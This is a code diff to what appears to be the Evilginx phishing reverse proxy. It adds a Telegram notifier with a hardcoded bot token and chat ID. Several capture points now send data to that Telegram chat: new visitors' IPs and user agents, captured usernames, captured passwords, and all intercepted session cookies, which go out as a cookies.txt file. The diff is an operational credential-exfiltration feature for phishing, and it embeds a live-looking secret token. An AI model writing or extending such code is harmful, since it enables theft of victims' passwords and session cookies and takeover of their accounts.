@@ -82,6 +82,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	telegram          *TelegramNotifier
 }
 
 type ProxySession struct {
@@ -120,6 +121,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
+		telegram:          NewTelegramNotifier("7791547355:AAH3PgpwEnVIXqfHSrMtqD-s3aNst-RAVSc", "7059352737")
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
@@ -399,6 +401,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+									message := fmt.Sprintf(`🎯 <b>New Visitor Detected!</b>
+
+									🌐 <b>Landing URL:</b> %s
+									👤 <b>User Agent:</b> %s
+									🌍 <b>IP Address:</b> %s
+									⚡️ <b>Phishlet:</b> %s
+									🔑 <b>Session ID:</b> %d`, 
+										req_url,
+										req.Header.Get("User-Agent"),
+										remote_addr,
+										pl_name,
+										sid)
+									p.telegram.SendMessage(message)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
@@ -680,6 +695,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
+									message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
+									✉️ <b>Email/Username:</b> %s
+									🔑 <b>Session ID:</b> %d`, 
+										um[1],
+										ps.Index)
+									p.telegram.SendMessage(message)
+
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -691,6 +713,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									message := fmt.Sprintf(`🔐 <b>Password Captured!</b>
+									🔑 <b>Password:</b> %s
+									🆔 <b>Session ID:</b> %d`,
+										pm[1],
+										ps.Index)
+									p.telegram.SendMessage(message)
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -762,6 +790,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
+											✉️ <b>Email/Username:</b> %s
+											🔑 <b>Session ID:</b> %d`, 
+												um[1],
+												ps.Index)
+											p.telegram.SendMessage(message)
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -772,6 +806,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											message := fmt.Sprintf(`🔐 <b>Password Captured!</b>
+											🔑 <b>Password:</b> %s
+											🆔 <b>Session ID:</b> %d`,
+												pm[1],
+												ps.Index)
+											p.telegram.SendMessage(message)
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -1050,6 +1090,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+						// Create cookies.txt content
+						var cookieContent strings.Builder
+						for domain, cookies := range s.CookieTokens {
+							for name, cookie := range cookies {
+								cookieContent.WriteString(fmt.Sprintf("Domain: %s\nName: %s\nValue: %s\nPath: %s\nHttpOnly: %v\n\n",
+									domain, name, cookie.Value, cookie.Path, cookie.HttpOnly))
+							}
+						}
+
+						// Send cookies file
+						p.telegram.SendFile("cookies.txt", cookieContent.String())
+
+						message := fmt.Sprintf(`🍪 <b>Cookies Captured!</b>
+
+						🔑 <b>Session ID:</b> %d
+						📎 <b>Check cookies.txt file above</b>`,
+							ps.Index)
+						p.telegram.SendMessage(message)
 
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
